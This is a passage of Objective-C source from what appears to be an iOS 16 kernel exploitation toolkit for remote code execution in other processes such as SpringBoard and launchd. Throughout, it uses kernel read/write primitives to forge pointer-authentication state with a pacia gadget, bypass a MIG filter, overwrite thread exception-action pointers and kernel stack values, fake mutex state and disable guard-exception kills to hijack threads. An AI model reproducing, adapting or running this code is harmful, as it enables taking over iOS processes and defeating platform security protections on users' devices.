        case 0: return "original-flags-raw-pc-lr";
        case 1: return "clear-all-signed-flags";
        case 2: return "clear-pc-flag-only";
        case 3: return "clear-lr-flags-only";
        case 4: return "original-flags-local-pacia-pc-lr";
        case 5: return "clear-all-local-pacia-pc-lr";
        default: return "unknown";
    }
}

- (BOOL)runFirstLandingPaciaProbeWithResult:(NSMutableString *)result
                              exceptionPort:(mach_port_t)exceptionPort
                                  exception:(excmsg *)exc
                                     thread:(uint64_t)thread
                              firstPortAddr:(uint64_t)firstPortAddr {
    if (!result || !exc) {
        return NO;
    }

    uint64_t gadget = findpacia();
    uint64_t address = nativestrip((uint64_t)getpid);
    uint64_t modifier = ptrauthstrdisc("pc");
    uint32_t originalFlags = exc->threadState.__flags;
    uint32_t clearAllFlags = originalFlags & ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC |
                                               __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                                               __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
    uint32_t mode = (uint32_t)g_rc_ios16_first_landing_pacia_mode;
    uint64_t diver = (uint64_t)originalFlags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
    uint64_t discPC = ptrauthblend(diver, ptrauthstrdisc("pc"));
    uint64_t discLR = ptrauthblend(diver, ptrauthstrdisc("lr"));
    arm_thread_state64_internal originalState = exc->threadState;
    arm_thread_state64_internal callState = exc->threadState;
    callState.__x[16] = address;
    callState.__x[17] = modifier;
    callState.__pc = nativestrip(gadget);
    callState.__lr = FAKE_LR_TROJAN_CREATOR;
    switch (mode) {
        case 0:
            callState.__flags = originalFlags;
            break;
        case 1:
            callState.__flags = clearAllFlags;
            break;
        case 2:
            callState.__flags = originalFlags & ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
            break;
        case 3:
            callState.__flags = originalFlags & ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                                                  __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
            break;
        case 4:
            callState.__pc = pacia(nativestrip(gadget), discPC);
            callState.__lr = pacia(FAKE_LR_TROJAN_CREATOR, discLR);
            callState.__flags = originalFlags;
            break;
        case 5:
            callState.__pc = pacia(nativestrip(gadget), discPC);
            callState.__lr = pacia(FAKE_LR_TROJAN_CREATOR, discLR);
            callState.__flags = clearAllFlags;
            break;
        default:
            callState.__flags = clearAllFlags;
            break;
    }

    [result appendFormat:@"probe: mode=%u(%s) gadget=0x%llx address=0x%llx modifier=0x%llx diver=0x%llx disc_pc=0x%llx disc_lr=0x%llx original_flags=0x%x call_pc=0x%llx raw_call_pc=0x%llx call_lr=0x%llx raw_call_lr=0x%llx call_flags=0x%x\n",
     mode,
     rc_ios16_pacia_mode_name((int)mode),
     gadget,
     address,
     modifier,
     diver,
     discPC,
     discLR,
     originalFlags,
     callState.__pc,
     nativestrip(callState.__pc),
     callState.__lr,
     nativestrip(callState.__lr),
     callState.__flags];
    if (!gadget) {
        [result appendString:@"probe: findpacia failed\n"];
        if (thread) {
            rc_ios16_clear_guard_ast_from_cpu(thread, "first-landing-pacia-no-gadget");
            clearguardexc(thread);
        }
        BOOL repliedOriginal = statereply(exc, &originalState);
        [result appendFormat:@"probe: reply_original_state=%d\n", repliedOriginal];
        return NO;
    }

    if (thread) {
        rc_ios16_clear_guard_ast_from_cpu(thread, "first-landing-pacia-before-reply");
        clearguardexc(thread);
    }

    BOOL replied = statereply(exc, &callState);
    [result appendFormat:@"probe: reply_to_gadget=%d\n", replied];
    if (!replied) {
        return NO;
    }

    excmsg exc2;
    memset(&exc2, 0, sizeof(exc2));
    BOOL gotSecond = waitexc(exceptionPort, &exc2, 1500, false);
    [result appendFormat:@"probe: got_second_exception=%d\n", gotSecond];
    if (!gotSecond) {
        return NO;
    }

    rc_append_exception_state_inventory(result, "pacia-return", &exc2, thread, firstPortAddr);
    uint64_t signedAddress = exc2.threadState.__x[16];
    [result appendFormat:@"probe: signed=0x%llx changed=%d stripped=0x%llx\n",
     signedAddress,
     signedAddress != address,
     nativestrip(signedAddress)];

    if (thread) {
        rc_ios16_clear_guard_ast_from_cpu(thread, "first-landing-pacia-before-restore");
        clearguardexc(thread);
    }
    BOOL restored = statereply(&exc2, &originalState);
    [result appendFormat:@"probe: restore_original_state=%d\n", restored];
    return restored;
}

- (BOOL)preflightRemotePaciaGadgetForProcessIOS16:(const char *)process result:(NSMutableString *)result {
    const uint32_t expectedGadget[] = {
        0xDAC10230,
        0xAA1003E0,
        0xD65F03C0,
    };
    uint32_t remoteGadget[sizeof(expectedGadget) / sizeof(expectedGadget[0])] = {0};
    uint64_t gadget = findpacia();
    uint64_t proc = process ? proc_find_by_name(process) : 0;
    uint64_t task = proc ? proc_task(proc) : 0;
    uint64_t vmMap = task ? task_get_vm_map(task) : 0;
    BOOL readOK = NO;
    BOOL match = NO;
    uint64_t gadgetPage = nativestrip(gadget) & ~PAGE_MASK;
    __block uint64_t containingStart = 0;
    __block uint64_t containingEnd = 0;
    __block uint64_t containingEntry = 0;

    _taskAddr = task;
    _vmMap = vmMap;
    if (gadget && _vmMap) {
        @try {
            vmmapiterateentries(_vmMap, ^(uint64_t start, uint64_t end, uint64_t entry, BOOL *stop) {
                if (nativestrip(gadget) >= start && nativestrip(gadget) < end) {
                    containingStart = start;
                    containingEnd = end;
                    containingEntry = entry;
                    *stop = YES;
                }
            });
        } @catch (NSException *exception) {
            [result appendFormat:@"preflight: vmmap_iter_exception name=%@ reason=%@\n",
             exception.name,
             exception.reason];
        }
        if (containingEntry) {
            uint32_t objectOrDelta = 0;
            uint64_t aliasRaw = 0;
            uint32_t entryStartWord = 0;
            BOOL entryStartMapOK = NO;
            uint32_t gadgetPageWord = 0;
            BOOL gadgetPageMapOK = NO;
            @try {
                objectOrDelta = ds_kread32(containingEntry + off_vm_map_entry_vme_object_or_delta);
                aliasRaw = ds_kread64(containingEntry + off_vm_map_entry_vme_alias);
            } @catch (NSException *exception) {
                [result appendFormat:@"preflight: entry_read_exception name=%@ reason=%@\n",
                 exception.name,
                 exception.reason];
            }
            @try {
                struct vmshmem shmem = vmmapremotepage(_vmMap, containingStart);
                entryStartMapOK = shmem.used;
                if (shmem.used) {
                    entryStartWord = *(volatile uint32_t *)(uintptr_t)shmem.localAddress;
                    mach_vm_deallocate(mach_task_self_, shmem.localAddress, PAGE_SIZE);
                }
            } @catch (NSException *exception) {
                [result appendFormat:@"preflight: entry_start_map_exception name=%@ reason=%@\n",
                 exception.name,
                 exception.reason];
            }
            @try {
                struct vmshmem shmem = vmmapremotepage(_vmMap, gadgetPage);
                gadgetPageMapOK = shmem.used;
                if (shmem.used) {
                    gadgetPageWord = *(volatile uint32_t *)((uintptr_t)shmem.localAddress + (nativestrip(gadget) & PAGE_MASK));
                    memcpy(remoteGadget, (void *)((uintptr_t)shmem.localAddress + (nativestrip(gadget) & PAGE_MASK)), sizeof(remoteGadget));
                    mach_vm_deallocate(mach_task_self_, shmem.localAddress, PAGE_SIZE);
                    readOK = YES;
                    match = memcmp(remoteGadget, expectedGadget, sizeof(expectedGadget)) == 0;
                }
            } @catch (NSException *exception) {
                [result appendFormat:@"preflight: gadget_page_map_exception name=%@ reason=%@\n",
                 exception.name,
                 exception.reason];
            }
            [result appendFormat:@"preflight: containing_entry start=0x%llx end=0x%llx entry=0x%llx object_or_delta=0x%x alias_raw=0x%llx gadget_page=0x%llx page_delta=0x%llx\n",
             containingStart,
             containingEnd,
             containingEntry,
             objectOrDelta,
             aliasRaw,
             gadgetPage,
             gadgetPage >= containingStart ? gadgetPage - containingStart : 0];
            [result appendFormat:@"preflight: entry_start_map_ok=%d entry_start_word=0x%08x gadget_page_map_ok=%d gadget_page_word=0x%08x\n",
             entryStartMapOK,
             entryStartWord,
             gadgetPageMapOK,
             gadgetPageWord];
        } else {
            [result appendFormat:@"preflight: containing_entry not_found gadget_page=0x%llx\n", gadgetPage];
        }
    }
    if (gadget && _vmMap && !readOK) {
        @try {
            readOK = [self remoteRead:nativestrip(gadget) to:remoteGadget size:sizeof(remoteGadget)];
        } @catch (NSException *exception) {
            [result appendFormat:@"preflight: remote_read_exception name=%@ reason=%@\n",
             exception.name,
             exception.reason];
            readOK = NO;
        }
        match = readOK && memcmp(remoteGadget, expectedGadget, sizeof(expectedGadget)) == 0;
    }

    [result appendFormat:@"preflight: process=%s proc=0x%llx task=0x%llx vmmap=0x%llx local_gadget=0x%llx read_ok=%d match=%d bytes=%08x %08x %08x expected=%08x %08x %08x\n",
     process ? process : "(null)",
     proc,
     task,
     vmMap,
     gadget,
     readOK,
     match,
     remoteGadget[0],
     remoteGadget[1],
     remoteGadget[2],
     expectedGadget[0],
     expectedGadget[1],
     expectedGadget[2]];
    return match;
}

- (void)rememberIOS16ExceptionActionsForThreadRo:(uint64_t)threadRo originalActions:(uint64_t)actions {
    if (!threadRo) {
        return;
    }

    for (int i = 0; i < g_rc_ios16_exception_actions_restore_count; i++) {
        if (g_rc_ios16_exception_actions_restore[i].threadRo == threadRo) {
            return;
        }
    }

    if (g_rc_ios16_exception_actions_restore_count >= (int)(sizeof(g_rc_ios16_exception_actions_restore) / sizeof(g_rc_ios16_exception_actions_restore[0]))) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) exception-actions restore table full, not tracking tro=0x%llx\n", threadRo);
        fflush(stdout);
        return;
    }

    g_rc_ios16_exception_actions_restore[g_rc_ios16_exception_actions_restore_count].threadRo = threadRo;
    g_rc_ios16_exception_actions_restore[g_rc_ios16_exception_actions_restore_count].actions = actions;
    g_rc_ios16_exception_actions_restore_count++;
}

- (void)restoreIOS16ExceptionActions {
    [self restoreIOS16ExceptionActionsSkippingThreadRo:0];
}

- (void)restoreIOS16ExceptionActionsSkippingThreadRo:(uint64_t)skipThreadRo {
    RC_IOS16_DEBUG_LOG("(rc.iOS16) restore exc-actions begin count=%d\n", g_rc_ios16_exception_actions_restore_count);
    fflush(stdout);

    for (int i = 0; i < g_rc_ios16_exception_actions_restore_count; i++) {
        uint64_t tro = g_rc_ios16_exception_actions_restore[i].threadRo;
        uint64_t actions = g_rc_ios16_exception_actions_restore[i].actions;
        if (skipThreadRo && tro == skipThreadRo) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) restore exc-actions skip current tro=0x%llx original=0x%llx\n", tro, actions);
            fflush(stdout);
            continue;
        }
        BOOL restored = rc_ios16_write64_in_zone_block(tro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS, actions);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) restore exc-actions tro=0x%llx original=0x%llx restored=%d\n", tro, actions, restored);
        fflush(stdout);
    }
    g_rc_ios16_exception_actions_restore_count = 0;
}

- (BOOL)verifyIOS16ExceptionActionsForThread:(uint64_t)thread exceptionPort:(mach_port_t)exceptionPort stage:(const char *)stage {
    uint64_t tro = thread_get_t_tro(thread);
    uint64_t actions = tro ? ds_kread64(tro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
    uint64_t guardAction = actions + (RC_EXC_GUARD_INDEX * RC_EXCEPTION_ACTION_SIZE);
    uint64_t expectedPort = rc_task_get_ipc_port_object(task_self(), exceptionPort);
    uint64_t port = actions ? ds_kread64(guardAction + RC_EXCEPTION_ACTION_PORT) : 0;
    uint32_t behavior = actions ? ds_kread32(guardAction + RC_EXCEPTION_ACTION_BEHAVIOR) : 0;
    uint32_t flavor = actions ? ds_kread32(guardAction + RC_EXCEPTION_ACTION_FLAVOR) : 0;
    uint32_t expectedBehavior = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    uint32_t expectedFlavor = ARM_THREAD_STATE64;
    BOOL ok = actions &&
              rc_kernel_ptr_matches(port, expectedPort) &&
              behavior == expectedBehavior &&
              flavor == expectedFlavor;

    RC_IOS16_DEBUG_LOG("(rc.iOS16) verify exc-actions %s: thread=0x%llx tro=0x%llx actions=0x%llx guard_action=0x%llx port=0x%llx expected_port=0x%llx behavior=0x%x expected_behavior=0x%x flavor=0x%x expected_flavor=0x%x ok=%d\n",
           stage ? stage : "unknown", thread, tro, actions, guardAction, port, expectedPort, behavior, expectedBehavior, flavor, expectedFlavor, ok);
    fflush(stdout);
    return ok;
}

- (BOOL)installIOS16SharedDummyExceptionActionsForThread:(uint64_t)thread exceptionPort:(mach_port_t)exceptionPort exceptionMask:(uint32_t)exceptionMask {
    kern_return_t kr = thread_set_exception_ports(_dummyThreadMach,
                                                  exceptionMask,
                                                  exceptionPort,
                                                  EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                                                  ARM_THREAD_STATE64);
    uint64_t targetTro = thread_get_t_tro(thread);
    uint64_t dummyTro = _dummyThreadTro;
    uint64_t targetOldActions = targetTro ? ds_kread64(targetTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
    uint64_t dummyActions = dummyTro ? ds_kread64(dummyTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
    RC_IOS16_DEBUG_LOG("(rc.iOS16) shared-actions fallback: kr=0x%x thread=0x%llx target_tro=0x%llx target_old_actions=0x%llx dummy_tro=0x%llx dummy_actions=0x%llx mask=0x%x\n",
           kr, thread, targetTro, targetOldActions, dummyTro, dummyActions, exceptionMask);
    fflush(stdout);

    if (!rc_is_kernel_ptr(targetTro)) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) shared-actions fallback rejected invalid target tro: thread=0x%llx tro=0x%llx\n", thread, targetTro);
        fflush(stdout);
        return NO;
    }
    if (!rc_is_kernel_ptr(dummyActions)) {
        return NO;
    }

    [self rememberIOS16ExceptionActionsForThreadRo:targetTro originalActions:targetOldActions];
    uint64_t writeAddr = targetTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS;
    BOOL wrote = rc_ios16_write64_in_zone_block(writeAddr, dummyActions);
    uint64_t after = ds_kread64(writeAddr);
    RC_IOS16_DEBUG_LOG("(rc.iOS16) shared-actions fallback write: addr=0x%llx value=0x%llx wrote=%d after=0x%llx\n",
           writeAddr, dummyActions, wrote, after);
    fflush(stdout);

    return wrote && rc_kernel_ptr_matches(after, dummyActions);
}

- (BOOL)setExceptionPortOnThreadIOS16:(mach_port_t)exceptionPort forThread:(uint64_t)currThread useMigFilterBypass:(BOOL)useMigFilterBypass {
    self.lastError = nil;
    bool success = false;
    void *thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void *pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!thread_set_exception_ports_addr || !pthread_exit_addr) {
        return false;
    }

    pthread_t pthread = NULL;
    int pthreadErr = pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    if (pthreadErr != 0 || !pthread) {
        return false;
    }

    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (machThread == MACH_PORT_NULL) {
        pthread_cancel(pthread);
        return false;
    }

    uint64_t machThreadAddr = rc_task_get_ipc_port_kobject(task_self(), machThread);
    if (!machThreadAddr) {
        pthread_cancel(pthread);
        return false;
    }

    if (useMigFilterBypass) {
        mig_bypass_monitor_threads(_selfThreadAddr, machThreadAddr);
    }

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        pthread_cancel(pthread);
        return false;
    }

    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);

    uint64_t exceptionMask = EXC_MASK_GUARD |
                             EXC_MASK_BAD_ACCESS |
                             EXC_MASK_BAD_INSTRUCTION |
                             EXC_MASK_BREAKPOINT |
                             EXC_MASK_ARITHMETIC;

    state.__x[0] = _dummyThreadMach;
    state.__x[1] = exceptionMask;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;

    if (useMigFilterBypass) {
        usleep(100000);
    }

    if (!threadsetstate(machThread, machThreadAddr, &state)) {
        pthread_cancel(pthread);
        return false;
    }

    if (useMigFilterBypass) {
        usleep(100000);
    }

    rc_ios16_log_exception_probe("before-mutex", machThreadAddr, _dummyThreadAddr, _selfThreadAddr, _selfThreadCtid);

    uint32_t dummyOriginalMutex = ds_kread32(_dummyThreadAddr + off_thread_mutex_lck_mtx_data);
    ds_kwrite32(_dummyThreadAddr + off_thread_mutex_lck_mtx_data, RC_IOS16_LCK_MTX_INTERLOCK_ONLY);
    RC_IOS16_DEBUG_LOG("(rc.iOS16) dummy mutex fake state=0x%x strategy=interlock-only self_ctid=0x%x dummy_ctid=0x%x\n",
           ds_kread32(_dummyThreadAddr + off_thread_mutex_lck_mtx_data),
           _selfThreadCtid,
           ds_kread32(_dummyThreadAddr + off_thread_ctid));
    fflush(stdout);

    rc_ios16_log_exception_probe("after-mutex", machThreadAddr, _dummyThreadAddr, _selfThreadAddr, _selfThreadCtid);

    if (!threadresume(machThread)) {
        self.lastError = [NSString stringWithFormat:@"iOS16 setExceptionPort helper thread_resume failed thread=0x%llx", currThread];
        pthread_cancel(pthread);
        return false;
    }
    RC_IOS16_DEBUG_LOG("(rc.iOS16) helper thread_resume OK mach=0x%x helper=0x%llx target=0x%llx\n",
           machThread,
           machThreadAddr,
           currThread);
    fflush(stdout);

    uint64_t targetTro = thread_get_t_tro(currThread);
    uint64_t targetActionsBefore = targetTro ? ds_kread64(targetTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
    if (targetTro) {
        [self rememberIOS16ExceptionActionsForThreadRo:targetTro originalActions:targetActionsBefore];
    }

    for (int i = 0; i < 10; i++) {
        usleep(200000);

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!kstack) {
            printf("(rc) [iter %d] Failed to get kstack. Retry...\n", i);
            fflush(stdout);
            continue;
        }

        RC_IOS16_DEBUG_LOG("(rc.iOS16) after-resume initial kstack=0x%llx spin=%d\n", kstack, i);
        fflush(stdout);

        uint64_t kernelSP = ds_kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!kernelSP) {
            printf("(rc) [iter %d] Failed to get SP. Retry...\n", i);
            fflush(stdout);
            continue;
        }

        uint64_t pageBase = trunc_page(kernelSP);
        uint64_t searchBase = pageBase;
        size_t searchSize = 0x4000;
        uint8_t *dataBuff = malloc(searchSize);
        if (!dataBuff) {
            break;
        }
        memset(dataBuff, 0, searchSize);
        ds_kreadbuf(searchBase, dataBuff, searchSize);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) [iter %d] dummy mutex after-kstack data=0x%x raw64=0x%llx\n",
               i,
               ds_kread32(_dummyThreadAddr + off_thread_mutex_lck_mtx_data),
               ds_kread64(_dummyThreadAddr + off_thread_mutex_lck_mtx_data));
        fflush(stdout);

        size_t exceptionMaskOff = 0;
        uint64_t exceptionMaskValue = 0;
        BOOL hasExceptionMask = rc_find_kernel_ptr_match(dataBuff, searchSize, exceptionMask, &exceptionMaskOff, &exceptionMaskValue);
        size_t dummyMachOff = 0;
        uint64_t dummyMachValue = 0;
        BOOL hasDummyMach = rc_find_kernel_ptr_match(dataBuff, searchSize, _dummyThreadMach, &dummyMachOff, &dummyMachValue);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) [iter %d] stack probes: exceptionMask=0x%llx off=%s0x%zx dummyMach=0x%llx off=%s0x%zx\n",
               i,
               exceptionMask,
               hasExceptionMask ? "" : "NO+",
               exceptionMaskOff,
               (uint64_t)_dummyThreadMach,
               hasDummyMach ? "" : "NO+",
               dummyMachOff);
        fflush(stdout);

        size_t foundOffset = 0;
        uint64_t foundValue = 0;
        BOOL found = rc_find_kernel_ptr_match(dataBuff, searchSize, _dummyThreadTro, &foundOffset, &foundValue);
        free(dataBuff);
        if (!found) {
            printf("(rc) [iter %d] Couldn't find g_RC_dummyThreadTro=0x%llx in pageBase=0x%llx\n", i, _dummyThreadTro, pageBase);
            fflush(stdout);
            rc_ios16_log_plausible_tro_stack_slots(searchBase, searchSize, targetTro);
            continue;
        }

        RC_IOS16_DEBUG_LOG("(rc.iOS16) [iter %d] Found PAC-stripped TRO match value=0x%llx needle=0x%llx\n",
               i, foundValue, _dummyThreadTro);
        fflush(stdout);

        int replaceCount = rc_ios16_replace_kernel_ptr_matches(searchBase, searchSize, _dummyThreadTro, targetTro);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) stack TRO replace-all count=%d searchBase=0x%llx size=0x%zx\n",
               replaceCount, searchBase, searchSize);
        fflush(stdout);
        if (replaceCount <= 0) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) stack TRO replace-all failed, retrying\n");
            fflush(stdout);
            continue;
        }

        uint64_t savedX27Addr = kstack + RC_IOS16_KERNEL_SAVED_X27;
        uint64_t savedX27Before = ds_kread64(savedX27Addr);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) [iter %d] saved-x27 addr=0x%llx value=0x%llx dummyTro=0x%llx targetTro=0x%llx\n",
               i, savedX27Addr, savedX27Before, _dummyThreadTro, targetTro);
        BOOL savedX27Matched = rc_kernel_ptr_matches(savedX27Before, _dummyThreadTro);
        if (savedX27Matched) {
            ds_kwrite64(savedX27Addr, targetTro);
        }
        uint64_t savedX27After = ds_kread64(savedX27Addr);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) saved-x27 TRO replace addr=0x%llx before=0x%llx matched=%d after=0x%llx\n",
               savedX27Addr, savedX27Before, savedX27Matched, savedX27After);
        fflush(stdout);
        if (savedX27Matched && rc_kernel_ptr_matches(savedX27After, targetTro)) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) saved-x27 TRO swap SUCCESS!\n");
        } else if (savedX27Matched) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) saved-x27 TRO swap verify failed after=0x%llx\n", savedX27After);
        } else {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) saved-x27 TRO swap observation only\n");
        }
        fflush(stdout);

        uint32_t restoredMutex = dummyOriginalMutex;
        ds_kwrite32(_dummyThreadAddr + off_thread_mutex_lck_mtx_data, restoredMutex);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) early mutex restore after TRO swap: restored=0x%x current=0x%x\n",
               restoredMutex,
               ds_kread32(_dummyThreadAddr + off_thread_mutex_lck_mtx_data));
        fflush(stdout);

        usleep(100000);
        if ([self verifyIOS16ExceptionActionsForThread:currThread exceptionPort:exceptionPort stage:"after-stack-swap"] ||
            [self verifyIOS16ExceptionActionsForThread:currThread exceptionPort:exceptionPort stage:"after-stack-swap-final"]) {
            success = true;
            break;
        }

        RC_IOS16_DEBUG_LOG("(rc.iOS16) stack TRO swap did not install usable EXC_GUARD action, trying shared dummy actions\n");
        fflush(stdout);
        if ([self installIOS16SharedDummyExceptionActionsForThread:currThread exceptionPort:exceptionPort exceptionMask:(uint32_t)exceptionMask] &&
            [self verifyIOS16ExceptionActionsForThread:currThread exceptionPort:exceptionPort stage:"after-shared-actions"]) {
            success = true;
            break;
        }

        RC_IOS16_DEBUG_LOG("(rc.iOS16) stack TRO swap did not install usable EXC_GUARD action\n");
        fflush(stdout);
    }

    int helperCleanupSpin = 0;
    uint64_t helperKstack = 0;
    for (; helperCleanupSpin < 5000; helperCleanupSpin++) {
        helperKstack = thread_get_kstackptr(machThreadAddr);
        if (!helperKstack) {
            break;
        }
        usleep(1000);
    }
    uint64_t helperWaitEvent = ds_kread64(machThreadAddr + off_thread_mutex_lck_mtx_data);
    uint64_t targetActions = targetTro ? ds_kread64(targetTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
    uint64_t dummyActions = _dummyThreadTro ? ds_kread64(_dummyThreadTro + RC_IOS16_OFF_THREAD_RO_EXC_ACTIONS) : 0;
    RC_IOS16_DEBUG_LOG("(rc.iOS16) helper cleanup after mutex restore: spin=%d helper_kstack=0x%llx observation_only=%d dummy_mutex=0x%x helper_wait_event=0x%llx target_thread=0x%llx target_tro=0x%llx target_actions=0x%llx dummy_tro=0x%llx dummy_actions=0x%llx\n",
           helperCleanupSpin,
           helperKstack,
           !success,
           ds_kread32(_dummyThreadAddr + off_thread_mutex_lck_mtx_data),
           helperWaitEvent,
           currThread,
           targetTro,
           targetActions,
           _dummyThreadTro,
           dummyActions);
    fflush(stdout);

    if (helperKstack) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) helper still in kernel after observation, leaving pthread untouched\n");
        fflush(stdout);
    }

    printf("(rc) set_exception_port_on_thread returning success=%d\n", success);
    fflush(stdout);
    if (!success) {
        self.lastError = [NSString stringWithFormat:@"iOS16 setExceptionPort failed before first exception thread=0x%llx helper=0x%llx", currThread, machThreadAddr];
    }

    thread_set_exception_ports(_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);

    if (useMigFilterBypass) {
        usleep(100000);
    }

    return success;
}

- (int)initRemoteCallForProcessIOS16:(const char *)process useMigFilterBypass:(BOOL)useMigFilterBypass {
    self.lastError = nil;
    if (!process || process[0] == '\0') {
        self.lastError = @"iOS16 RemoteCall missing process name";
        return -1;
    }

    _liveContainerRuntime = islcruntime();
    uint64_t procAddr = proc_find_by_name(process);
    if (!procAddr) {
        printf("(rc) Unable to find process: %s\n", process);
        return -1;
    }
    printf("(rc) process: %s, pid: %u\n",  process, ds_kread32(procAddr + off_proc_p_pid));
    _taskAddr = proc_task(procAddr);
    if (!_taskAddr) {
        return -1;
    }

    mach_port_t firstExceptionPort = createexcport();
    mach_port_t secondExceptionPort = createexcport();
    printf("(rc) firstExceptionPort: 0x%x, secondExceptionPort: 0x%x\n", firstExceptionPort, secondExceptionPort);
    if (!firstExceptionPort || !secondExceptionPort) {
        printf("(rc) Couldn't create exception ports\n");
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    if (!rc_disable_excguard_kill_checked(_taskAddr)) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    mach_exception_code_t guardCode = 0;
    EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
    EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
    EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503ULL);

    uint64_t selfTask = task_self();
    uint64_t firstPortAddr = rc_task_get_ipc_port_object(selfTask, firstExceptionPort);
    uint64_t secondPortAddr = rc_task_get_ipc_port_object(selfTask, secondExceptionPort);
    if (!firstPortAddr || !secondPortAddr) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    pthread_t dummyThread = NULL;
    void *dummyFunc = dlsym(RTLD_DEFAULT, "getpid");
    if (!dummyFunc) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    int dummyErr = pthread_create_suspended_np(&dummyThread, NULL, (void *(*)(void *))dummyFunc, NULL);
    if (dummyErr != 0 || !dummyThread) {
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    mach_port_t dummyThreadMach = pthread_mach_thread_np(dummyThread);
    if (dummyThreadMach == MACH_PORT_NULL) {
        pthread_cancel(dummyThread);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }

    uint64_t dummyThreadAddr = rc_task_get_ipc_port_kobject(selfTask, dummyThreadMach);
    uint64_t dummyThreadTro = ds_kread64(dummyThreadAddr + off_thread_t_tro);
    mach_port_t threadSelf = mach_thread_self();
    uint64_t selfThreadAddr = rc_task_get_ipc_port_kobject(selfTask, threadSelf);
    uint32_t selfThreadCtid = ds_kread32(selfThreadAddr + off_thread_ctid);
    if (!dummyThreadAddr || !dummyThreadTro || !selfThreadAddr) {
        pthread_cancel(dummyThread);
        mach_port_deallocate(mach_task_self_, threadSelf);
        mach_port_destruct(mach_task_self_, firstExceptionPort, 0, 0);
        mach_port_destruct(mach_task_self_, secondExceptionPort, 0, 0);
        return -1;
    }
    mach_port_deallocate(mach_task_self_, threadSelf);

    _creatingExtraThread = false;
    _firstExceptionPort = firstExceptionPort;
    _secondExceptionPort = secondExceptionPort;
    _firstExceptionPortAddr = firstPortAddr;
    _secondExceptionPortAddr = secondPortAddr;
    _dummyThread = dummyThread;
    _dummyThreadMach = dummyThreadMach;
    _dummyThreadAddr = dummyThreadAddr;
    _dummyThreadTro = dummyThreadTro;
    _selfThreadAddr = selfThreadAddr;
    _selfThreadCtid = selfThreadCtid;
    _trojanMemIsStackFallback = false;
    _trojanMemScratchOffset = 0;
    self.threadList = [NSMutableArray new];

    int retryCount = 0;
    int validThreadCount = 0;
    int successThreadCount = 0;
    BOOL useSpringBoardActiveScan = strcmp(process, "SpringBoard") == 0;
    int targetSuccessThreadCount = strcmp(process, "SpringBoard") == 0 ? 1 : (strcmp(process, "launchd") == 0 ? 8 : 1);
    BOOL allowInactiveFallback = strcmp(process, "SpringBoard") == 0 && !useSpringBoardActiveScan;
    uint64_t inactiveFallbackThread = 0;
    uint64_t inactiveFallbackKstack = 0;
